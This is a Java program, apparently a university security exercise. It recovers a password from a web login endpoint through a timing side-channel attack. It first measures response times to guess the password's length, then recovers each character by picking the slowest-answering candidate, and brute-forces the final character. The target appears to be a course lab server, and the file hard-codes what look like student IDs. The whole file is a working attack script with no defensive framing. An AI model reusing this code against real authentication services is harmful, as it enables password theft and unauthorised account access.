import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Objects;

public class ex01_M2_V2 {

    private final static String USER = "201553864";//"315617506";//"305938771";
    private final static String URL = "http://aoi.ise.bgu.ac.il/?user=%s&password=%s";
    private final static int CHAR_TRIES = 4;
    private final static int LENGTH_TRIES = 4;
    private final static int MAX_PASSWORD_LENGTH = 32;
    private final static double THRESHOLD = 1.2;

    private final static char[] CHARS = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};

    private final static String ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    public static void main(String[] args) {

        long start = System.currentTimeMillis();

        int length;

        try {
            length = get_length();
            System.out.println(length);
            String res = find_password(length, "");
            System.out.println(String.format("%s ",USER)  + res);
        } catch (Exception ex) {
            System.out.println("We have a problem");
        }
        System.out.println(System.currentTimeMillis() - start);
    }

    private static String find_password(int length, String password) throws Exception {
        StringBuilder temp_password = new StringBuilder(password);
        String next_char;
        String delete_later;
        while (temp_password.length() < length - 1) {

            //do next_char = get_next_char(temp_password.toString(), length);
            //while (Objects.equals(next_char, "-1"));
            temp_password.append(analize_n_th(temp_password.toString(), length));

            //temp_password.append(next_char);
            //System.out.println(next_char);
        }

        try{
            String finale = find_final_char(temp_password.toString());
            while (Objects.equals(finale, "We have a problem")){
                finale = find_final_char(temp_password.toString());
            }
            return finale;
        } catch (Exception ex) {
            return find_password(length, temp_password.substring(0, temp_password.length() - 1));//"We have a problem";//
        }
    }

    private static String find_final_char(String password) throws Exception {
        for (char last: CHARS) {
            String temp_password = password + String.valueOf(last);
            URL url = new URL(String.format(URL, USER, temp_password));
            BufferedReader in = new BufferedReader (new InputStreamReader((url.openConnection()).getInputStream()));
            if (Objects.equals(in.readLine(), "1")) return temp_password;
        }
        //return "We have a problem";
        return "We have a problem";
    }

    private static String get_next_char(String prefix, int length) throws Exception {

        String padding = "";

        for (int i = 1; i < length - prefix.length(); i++){
            padding += "a";
        }

        long[] times = new long[CHARS.length];
        String current = prefix + CHARS[0] + padding;
        long max = times[0] = get_time(current);

        for (int i = 1; i < CHARS.length; i++){
            current = prefix + CHARS[i] + padding;
            //System.out.println(current);
            times[i] = get_time(current);
            if (times[i] > max * THRESHOLD) {
                return String.valueOf(CHARS[i]);
            }
            if (times[i] > max) max = times[i];
        }
        int location = get_max(times, THRESHOLD);

        if (location == -1) return String.valueOf(location);

        return String.valueOf(CHARS[location]);
    }

    private static long get_time(String current) throws Exception {
        long[] samples = new long[CHAR_TRIES];
        long end, start;
        URL url = new URL(String.format(URL,USER,current));
        for (int i = 0; i < CHAR_TRIES; i++) {
            start = System.currentTimeMillis();
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openConnection().getInputStream()));
            end = System.currentTimeMillis();
            samples[i] = end - start;
        }
        return min(samples);
    }

    private static long min(long[] times){
        long min = times[0];
        for (int i = 1; i < times.length; i++) {
            if (times[i] < min) min = times[i];
        }
        return min;
    }

    private static int get_length() {
        String password = "a";
        int password_length = 0;
        try {
            long[] length_times = new long[MAX_PASSWORD_LENGTH];
            for (int i = 0; i < MAX_PASSWORD_LENGTH; i++) {

                URL url = new URL(String.format(URL, USER, password));

                long[] times = new long[LENGTH_TRIES];

                for (int j = 0; j < LENGTH_TRIES; j++) {
                    times[j] = attempt(url);
                }

                length_times[i] = get_min(times);
                password += "a";
            }

            password_length = get_max(length_times, 1.0) + 1;

        } catch (Exception ex) {
            System.out.println("We have a problem");
        }
        return password_length;
    }

    private static long attempt(URL url) throws Exception {
        long endTime;
        //System.out.println(url.toString());
        long startTime = System.currentTimeMillis();
        BufferedReader in = new BufferedReader (new InputStreamReader(((HttpURLConnection)url.openConnection()).getInputStream()));
        endTime = System.currentTimeMillis();
        return (endTime - startTime);// * TIME_SCALE;
    }

    private static int get_max(long[] averages, double threshold){

        int char_location = -1;
        long max = averages[0];

        if (averages.length == 1 || max > averages[1] * threshold)
            char_location = 0;

        for (int k = 1; k < averages.length; k++) {
            if (averages[k] > max * threshold) {
                max = averages[k];
                char_location = k;
            }
        }
        return char_location;
    }

    private static long get_min(long[] times){
        long min = 999999999;
        for (long time : times) {
            if (time < min) min = time;
        }
        return min;
    }

    private static String analize_n_th(String prev, int length) throws Exception {

        StringBuilder bstab = new StringBuilder();
        for (int i = prev.length(); i < length - 1; i++) {
            bstab.append('a');
        }
        String stab = bstab.toString();
        long[] times = new long[CHARS.length];
        String argmax = "a";
        long max = 0;
        double sm = 0;
        for (int k = 0; k < CHARS.length; k++) {
            String password = prev + CHARS[k] + stab;
            URL url = new URL(String.format(URL, USER,password));
            times[k] += check_n(url, CHAR_TRIES);

            if (max == 0) {
                max = times[k];
                argmax = Character.toString(CHARS[k]);
            } else if (max < times[k]) {
                argmax = Character.toString(CHARS[k]);
                if ((max) * THRESHOLD < (times[k])) {
                    //System.out.println(argmax);
                    return argmax;
                }
                max = times[k];
            }
            if (k == 5 && times[0] == max && (max) > (sm / k) * THRESHOLD) {
                return Character.toString(CHARS[0]);
            }
            sm += times[k];

        }
        System.out.println(argmax);
        return argmax;
    }

    private static long check_n(URL url,int n) throws Exception {
        long t1 = System.currentTimeMillis();
        for (int i = 0; i <n ; i++) {
            try (BufferedReader in = new BufferedReader(new InputStreamReader(((HttpURLConnection) url.openConnection()).getInputStream()))) {

            }
        }
        long t2 = System.currentTimeMillis();
        return t2 - t1;
    }
}
